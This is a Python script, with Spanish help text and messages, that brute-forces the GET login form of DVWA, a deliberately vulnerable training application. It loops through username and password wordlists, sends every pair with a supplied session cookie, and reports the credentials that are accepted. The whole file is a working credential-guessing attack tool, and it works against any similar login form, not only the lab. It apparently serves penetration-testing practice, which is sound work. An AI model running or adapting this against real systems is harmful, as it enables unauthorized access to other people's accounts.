#!/usr/bin/env python3
import requests, argparse, sys
def parse_args():
    p = argparse.ArgumentParser(description='Brute Force DVWA GET Form')
    p.add_argument('--url',       required=True, help='URL del form GET')
    p.add_argument('--users',     required=True, help='Archivo de usuarios')
    p.add_argument('--passwords', required=True, help='Archivo de contraseñas')
    p.add_argument('--session',   required=True, help='Valor de PHPSESSID activo con security=low')
    p.add_argument('--fail-string',
                   default='username and/or password incorrect.',
                   help='Texto exacto de fallo (lowercase, con punto)')
    return p.parse_args()
def main():
    args = parse_args()
    try:
        users = [l.strip() for l in open(args.users) if l.strip()]
        pwds  = [l.strip() for l in open(args.passwords) if l.strip()]
    except IOError as e:
        print(f"ERROR al leer listas: {e}")
        sys.exit(1)
    cookies = {'PHPSESSID': args.session, 'security': 'low'}
    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    found = []
    print(f"[*] Iniciando ataque contra {args.url}")
    for u in users:
        for p in pwds:
            r = requests.get(args.url,
                             params={'username': u, 'password': p, 'Login': 'Login'},
                             cookies=cookies,
                             headers=headers)
            body = r.text.lower()
            if args.fail_string.lower() not in body:
                print(f"[+] VÁLIDO → {u} | {p}")
                found.append((u, p))
    if not found:
        print("[-] No se hallaron credenciales válidas.")
    else:
        print("\n== Credenciales válidas encontradas ==")
        for u, p in found:
            print(f" - {u}  :  {p}")
if __name__ == '__main__':
    main()